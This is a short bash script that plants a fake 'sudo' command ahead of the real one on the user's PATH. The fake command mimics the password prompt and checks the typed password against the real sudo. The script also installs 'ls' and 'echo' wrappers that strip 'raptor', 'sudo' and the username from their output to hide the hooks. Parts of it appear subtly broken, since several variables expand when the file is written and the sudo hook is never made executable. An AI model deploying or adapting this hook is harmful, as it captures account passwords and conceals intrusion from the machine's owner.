#!/bin/bash

PATH=~/raptor:$PATH

mkdir ~/raptor

#Hook sudo
echo "#! /bin/bash" >> ~/raptor/sudo
echo "v=0" >> ~/raptor/sudo
echo "while [ $v == 0 ]" >> ~/raptor/sudo
echo "do" >> ~/raptor/sudo
echo "  f= read -rsp \"[sudo] password for \$(whoami): \" p" >> ~/raptor/sudo
echo "  /usr/bin/sudo -k" >> ~/raptor/sudo
echo "  echo \"\"" >> ~/raptor/sudo
echo "if /usr/bin/sudo -lS &> /dev/null << EOF" >> ~/raptor/sudo
echo "$p" >> ~/raptor/sudo
echo "EOF" >> ~/raptor/sudo
echo "then" >> ~/raptor/sudo
echo "    v=1" >> ~/raptor/sudo
echo "  else" >> ~/raptor/sudo
echo "    echo \"Sorry, try again.\"" >> ~/raptor/sudo
echo "  fi" >> ~/raptor/sudo
echo "done" >> ~/raptor/sudo
echo "" >> ~/raptor/sudo
echo "/usr/bin/sudo $@" >> ~/raptor/sudo

#Hook ls
echo "#!/bin/bash" > ~/raptor/ls
echo "/bin/ls -$@ -C --color=always | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | cat" >> ~/raptor/ls
chmod +x ~/raptor/ls

#Hook echo
echo "#!/bin/bash" > ~/raptor/echo
echo "/bin/echo $@ | sed s/$(whoami)//g" >> ~/raptor/echo
chmod +x ~/raptor/echo

alias ls=ls

exec bash
